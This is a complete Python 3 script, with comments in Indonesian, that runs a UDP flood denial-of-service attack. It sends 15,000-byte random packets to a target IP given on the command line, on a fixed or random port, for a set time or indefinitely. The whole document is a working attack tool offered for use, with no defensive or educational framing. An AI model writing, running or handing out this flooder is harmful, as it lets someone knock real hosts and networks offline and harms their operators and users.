#!/usr/bin/python3
import socket
import random
import sys
import time

if len(sys.argv) == 1:
    sys.exit('Usage: f.py ip port(0=random) length(0=forever)')

def UDPFlood():
    port = int(sys.argv[2])
    randport = (True, False)[port == 0]
    ip = sys.argv[1]
    dur = int(sys.argv[3])
    
    # Gunakan time.perf_counter sebagai pengganti time.clock
    clock = time.perf_counter
    duration = (1, (clock() + dur))[dur > 0]
    
    print('Flooding target: %s:%s for %s seconds' % (ip, port, dur or 'infinite'))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(15000)
    
    while True:
        port = (random.randint(1, 65535), port)[randport]  # Port maksimum adalah 65535
        if clock() < duration or dur == 0:
            sock.sendto(bytes, (ip, port))
        else:
            break
    print('DONE')

# Panggil fungsi UDPFlood
UDPFlood()
